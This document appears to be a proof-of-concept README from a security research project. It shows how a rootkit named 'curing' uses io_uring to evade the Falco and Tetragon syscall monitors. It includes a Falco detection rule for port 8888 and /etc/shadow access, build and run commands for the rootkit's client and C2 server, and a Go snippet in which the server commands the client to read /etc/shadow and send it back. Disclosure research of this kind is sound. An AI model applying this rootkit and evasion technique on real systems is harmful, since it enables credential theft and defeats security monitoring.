# POC bypassing Falco

As a POC, we will bypass Falco by running the latest version Falco on the machine with the following rules:

* Detect any TCP connection attempts to port 8888
* Detect access to /etc/shadow 

## Running Falco
Let's start by running Falco on the machine where `curing` is running.

To run Falco, we will use the following command:
```shell
docker run --rm -i -t --name falco --privileged  \
    -v $(pwd)/falco_custom_rules.yaml:/etc/falco/falco_rules.local.yaml \
    -v /var/run/docker.sock:/host/var/run/docker.sock \
    -v /dev:/host/dev -v /proc:/host/proc:ro -v /boot:/host/boot:ro \
    -v /lib/modules:/host/lib/modules:ro -v /usr:/host/usr:ro -v /etc:/host/etc:ro \
    falcosecurity/falco-no-driver:0.39.2 falco
```

The `falco_custom_rules.yaml` file contains the following rule to detect any TCP connection attempts to port 8888 (detecting access to `/etc/shadow` is built-in):
```yaml
- rule: TCP Connection to Port 8888
  desc: Detect any TCP connection attempts to port 8888
  condition: >
    evt.type=connect and 
    evt.dir=< and 
    fd.type=ipv4 and 
    fd.sport=8888 and 
    fd.l4proto=tcp
  output: >
    TCP connection to port 8888 detected 
    (process=%proc.name 
    command=%proc.cmdline 
    connection=%fd.name 
    container=%container.info 
    user=%user.name)
  priority: NOTICE
  tags: [network]
```

## Showing regular Falco alerts
To show that Falco is working, we ran `nc` to connect to port 8888 and access `/etc/shadow`:

https://github.com/user-attachments/assets/49560105-76e3-4972-adcf-cb325b234cbe

We can see that Falco detected the connection to port 8888 and access to `/etc/shadow` as expected.

## Bypassing Falco
To bypass Falco, we will run the `curing` client and server.
To build the `curing` client and server, we will use the following commands:
```shell
make all
```

To run the `curing` server, we will use the following command:
```shell
./build/server
```

To control the server port, edit the server.port in `cmd/config.json`, the default port is 8888.

To run the `curing` client, we will use the following command:
```shell
./build/client
```
It will read the `cmd/config.json` file to connect to the server so be sure to edit the details in the file.

For the sake of this POC, the server is just going to send one command to the client to read `/etc/shadow` and send it back to the server.
```go
commands := []common.Command{
  common.ReadFile{Id: "read shadow", Path: "/etc/shadow"},
}
```
You can edit the commands in the `pkg/server.go` file.

The `curing` rookit is using `io_uring` to connect to the server and to read the file `/etc/shadow`, this means that "0" syscalls (which are related to the attack) are made and Falco will not detect the attack.

https://github.com/user-attachments/assets/858dbc60-ffa4-445e-a354-a08caa83b102

As we can see, Falco is not detecting the attack because the attack is not using any syscalls that Falco is monitoring, of course the server ip should be non localhost to actually prove the bypass.

## Conclusion
In this POC, we bypassed Falco by using `io_uring` to connect to the server and read the file `/etc/shadow`. This means that Falco is not able to detect the attack because the attack is not using any syscalls that Falco is monitoring, this attack technique is also bypassing other security tools that are monitoring syscalls such as Tetragon by Cilium.
